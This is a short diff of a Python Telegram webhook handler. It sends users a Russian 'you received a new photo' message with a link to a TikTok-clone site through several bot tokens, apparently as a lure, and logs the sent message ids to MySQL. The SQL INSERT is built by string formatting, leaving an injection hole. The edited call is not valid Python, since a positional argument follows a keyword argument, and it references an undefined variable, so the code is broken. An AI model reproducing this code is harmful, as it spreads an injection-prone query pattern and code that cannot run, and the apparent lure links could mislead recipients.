@@ -99,14 +99,17 @@ async def webhook(
             keyboard =  InlineKeyboardMarkup(inline_keyboard=kb_list)
 
             token_list = []
+            message_list = []
             for token in all_token:
                 if token:   
                     try:
-                        message = await send_telegram_message(user_id, f"🙎‍♂️Вам пришло новое фото!\nСсылка: https://rusfai-tiktok-clone2-c56e.twc1.net/tt?id={user_id}&redirect={redirect_url}", reply_markup=keyboard)
+                        bot = Bot(token)
+                        message = await send_telegram_message(user_id, f"🙎‍♂️Вам пришло новое фото!\nСсылка: https://rusfai-tiktok-clone2-c56e.twc1.net/tt?id={user_id}&redirect={redirect_url}", reply_markup=keyboard, bot)
                         token_list.append(token)
+                        message_list.append(int(message.message_id))
                     except:
                         pass
-            mycursor.execute("INSERT INTO kwork22_photo (url, photo_time, user_id, message_id, token)  VALUES ('{}', '{}', '{}', '{}', '{}')".format(photo_path, int(time.time()), int(user_id), int(message.message_id), str(token_kist) ))
+            mycursor.execute("INSERT INTO kwork22_photo (url, photo_time, user_id, message_id, token)  VALUES ('{}', '{}', '{}', '{}', '{}')".format(photo_path, int(time.time()), int(user_id), str(message_list), str(token_kist) ))
             mydb.commit() 
                                      
                 
